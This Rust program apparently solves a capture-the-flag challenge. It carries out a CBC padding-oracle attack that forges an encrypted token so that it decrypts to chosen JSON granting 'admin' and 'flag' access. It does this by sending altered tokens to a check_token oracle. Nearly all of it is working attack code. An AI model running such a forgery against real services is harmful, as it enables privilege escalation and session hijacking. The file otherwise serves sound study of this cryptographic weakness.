use padding_oracle_attack::*;

#[tokio::main]
async fn main() {
    let tampered_token: Vec<u8> = Vec::new();
    //let token: Vec<u8> = fetch_token().await;
    let msg: String = String::new();

    println!("\n=== admin ===");
    tamper_token(r#"{"id":9,"admin":true}"#).await;

    println!("\n=== flag ===");
    tamper_token(r#"{"id":9,"admin":false,"flag":true}"#).await;
}

//async fn tamper_token(token: &Vec<u8>, target_text: &str) {
async fn tamper_token(target_text: &str) {
    let padding_length = BLOCK_SIZE - target_text.len()%BLOCK_SIZE;
    // message bytes
    let mut target_bytes = Vec::with_capacity(target_text.len() + padding_length);
    target_bytes.extend(target_text.as_bytes());
    target_bytes.extend(std::iter::repeat(padding_length as u8).take(padding_length));
    // cipher bytes
    let mut tampered_token = vec![0u8; target_bytes.len() + BLOCK_SIZE];
    // block
    let block_count = tampered_token.len() / BLOCK_SIZE;

    for block_offset in 1..block_count {
        let mut modified_token: Vec<u8> = tampered_token[..(tampered_token.len() - BLOCK_SIZE*(block_offset - 1))].to_vec();
        for byte_offset in 1..=BLOCK_SIZE {
            for i in (0u8..255).rev() { // try the original value last ( token ^ i: 255 ~ 0 )
                let byte_index = BLOCK_SIZE*block_count - BLOCK_SIZE*block_offset - byte_offset;
    
                modified_token[byte_index] = tampered_token[byte_index] ^ i;
    
                let msg = check_token(&modified_token).await;
                if msg != "decrypt error" {
                    tampered_token[byte_index] ^= modified_token[byte_index] ^ (byte_offset as u8) ^ target_bytes[byte_index];
                    println!("{:02x?}", modified_token);
                    for j in 0..byte_offset {
                        modified_token[byte_index + j] ^= byte_offset as u8;     // reset value
                        modified_token[byte_index + j] ^= byte_offset as u8 + 1; // set next padding
                    }
                    break;
                }
            }
        }
    }

    println!("\n=== decode: tampared token  ===");
    println!("{:02x?}", debug::decrypt_token(&tampered_token));

    println!("\n=== check token ===");
    let msg = check_token(&tampered_token).await;
    println!("{msg}");
}
